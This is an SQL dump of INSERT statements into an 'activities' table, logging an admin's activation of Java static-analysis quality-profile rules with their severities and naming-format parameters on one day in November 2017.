INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2641, '2017-11-20 12:19:05.714', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiFybbGRdfPp-rG1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2642, '2017-11-20 12:19:05.733', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiGFbbGRdfPp-rG2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2643, '2017-11-20 12:19:05.756', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiGcbbGRdfPp-rG3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2644, '2017-11-20 12:19:05.772', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiGsbbGRdfPp-rG4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2645, '2017-11-20 12:19:05.867', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiILbbGRdfPp-rG5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2646, '2017-11-20 12:19:05.888', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiIgbbGRdfPp-rG6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2647, '2017-11-20 12:19:05.917', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiI9bbGRdfPp-rG7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2648, '2017-11-20 12:19:05.953', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiJhbbGRdfPp-rG8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2649, '2017-11-20 12:19:05.986', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiKCbbGRdfPp-rG9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2650, '2017-11-20 12:19:06.014', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiKebbGRdfPp-rG-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2651, '2017-11-20 12:19:06.042', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiK6bbGRdfPp-rG_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2652, '2017-11-20 12:19:06.072', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiLYbbGRdfPp-rHA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2653, '2017-11-20 12:19:06.109', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiL9bbGRdfPp-rHB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2654, '2017-11-20 12:19:06.14', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiMcbbGRdfPp-rHC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2655, '2017-11-20 12:19:06.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiM3bbGRdfPp-rHD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2656, '2017-11-20 12:19:06.184', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiNIbbGRdfPp-rHE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2657, '2017-11-20 12:19:06.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiNfbbGRdfPp-rHF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2658, '2017-11-20 12:19:06.225', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiNxbbGRdfPp-rHG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2659, '2017-11-20 12:19:06.252', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiOMbbGRdfPp-rHH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2660, '2017-11-20 12:19:06.279', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiOnbbGRdfPp-rHI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2661, '2017-11-20 12:19:06.306', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiPCbbGRdfPp-rHJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2662, '2017-11-20 12:19:06.332', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiPcbbGRdfPp-rHK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2663, '2017-11-20 12:19:06.357', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiP1bbGRdfPp-rHL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2664, '2017-11-20 12:19:06.422', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiQ2bbGRdfPp-rHM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2665, '2017-11-20 12:19:06.482', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiRybbGRdfPp-rHN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2666, '2017-11-20 12:19:06.537', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiSpbbGRdfPp-rHO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2667, '2017-11-20 12:19:06.61', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiTybbGRdfPp-rHP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2668, '2017-11-20 12:19:06.654', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiUebbGRdfPp-rHQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2669, '2017-11-20 12:19:06.687', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiU_bbGRdfPp-rHR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2670, '2017-11-20 12:19:06.712', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiVYbbGRdfPp-rHS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2671, '2017-11-20 12:19:06.738', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiVybbGRdfPp-rHT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2672, '2017-11-20 12:19:06.762', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiWKbbGRdfPp-rHU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2673, '2017-11-20 12:19:06.8', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiWwbbGRdfPp-rHV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2674, '2017-11-20 12:19:06.823', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiXHbbGRdfPp-rHW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2675, '2017-11-20 12:19:06.857', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiXpbbGRdfPp-rHX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2676, '2017-11-20 12:19:06.883', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiYDbbGRdfPp-rHY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2677, '2017-11-20 12:19:06.901', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiYVbbGRdfPp-rHZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2678, '2017-11-20 12:19:06.925', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiYtbbGRdfPp-rHa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2679, '2017-11-20 12:19:06.949', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiZFbbGRdfPp-rHb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2680, '2017-11-20 12:19:06.975', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiZfbbGRdfPp-rHc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2681, '2017-11-20 12:19:07.016', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiaIbbGRdfPp-rHd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2682, '2017-11-20 12:19:07.042', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiaibbGRdfPp-rHe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2683, '2017-11-20 12:19:07.073', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXibBbbGRdfPp-rHf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2684, '2017-11-20 12:19:07.099', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXibbbbGRdfPp-rHg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2685, '2017-11-20 12:19:07.117', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXibtbbGRdfPp-rHh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2686, '2017-11-20 12:19:07.142', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXicGbbGRdfPp-rHi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2687, '2017-11-20 12:19:07.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXicgbbGRdfPp-rHj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2688, '2017-11-20 12:19:07.187', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiczbbGRdfPp-rHk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2689, '2017-11-20 12:19:07.212', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXidMbbGRdfPp-rHl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2690, '2017-11-20 12:19:07.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXidmbbGRdfPp-rHm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2691, '2017-11-20 12:19:07.274', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXieKbbGRdfPp-rHn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2692, '2017-11-20 12:19:07.311', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXievbbGRdfPp-rHo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2693, '2017-11-20 12:19:07.354', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXifabbGRdfPp-rHp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2694, '2017-11-20 12:19:07.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXigMbbGRdfPp-rHq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2695, '2017-11-20 12:19:07.439', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXigvbbGRdfPp-rHr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2696, '2017-11-20 12:19:07.486', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXihebbGRdfPp-rHs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2697, '2017-11-20 12:19:07.512', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXih4bbGRdfPp-rHt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2698, '2017-11-20 12:19:07.54', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiiUbbGRdfPp-rHu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2699, '2017-11-20 12:19:07.565', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiitbbGRdfPp-rHv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2700, '2017-11-20 12:19:07.606', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXijWbbGRdfPp-rHw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2701, '2017-11-20 12:19:07.636', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXij0bbGRdfPp-rHx');
